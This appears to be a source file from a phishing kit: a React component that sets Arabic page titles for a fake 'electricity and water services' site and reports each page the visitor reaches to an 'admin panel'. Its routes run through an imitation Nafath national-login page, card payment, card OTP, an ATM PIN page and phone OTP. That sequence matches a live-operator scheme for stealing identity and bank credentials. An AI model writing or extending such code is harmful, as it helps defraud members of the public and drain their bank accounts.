import { useEffect } from "react";
import { useLocation } from "wouter";
import { updatePage } from "@/lib/store";

export default function PageTitleUpdater() {
  const [location] = useLocation();

  useEffect(() => {
    let title = "خدمات الكهرباء والماء"; // Default title

    // Map all routes to Arabic page names
    const routeToTitle: Record<string, string> = {
      "/": "خدمات الكهرباء والماء",
      "/nafath": "نفاذ",
      "/nafath-login": "نفاذ - تسجيل دخول",
      "/nafath-login-page": "نفاذ - تسجيل دخول",
      "/nafath-verify": "تحقق نفاذ",
      "/summary-payment": "الملخص والدفع",
      "/credit-card-payment": "صفحة الدفع",
      "/otp-verification": "OTP البطاقة",
      "/atm-password": "كلمة مرور ATM",
      "/phone-verification": "توثيق الجوال",
      "/phone-otp": "تحقق رقم الجوال (OTP)",
      "/final-page": "الصفحة النهائية",
    };

    // Get title from map or use default
    title = routeToTitle[location] || "خدمات الكهرباء والماء";

    // Update browser title
    document.title = title;
    
    // Update page name in admin panel
    updatePage(title);
  }, [location]);

  return null;
}
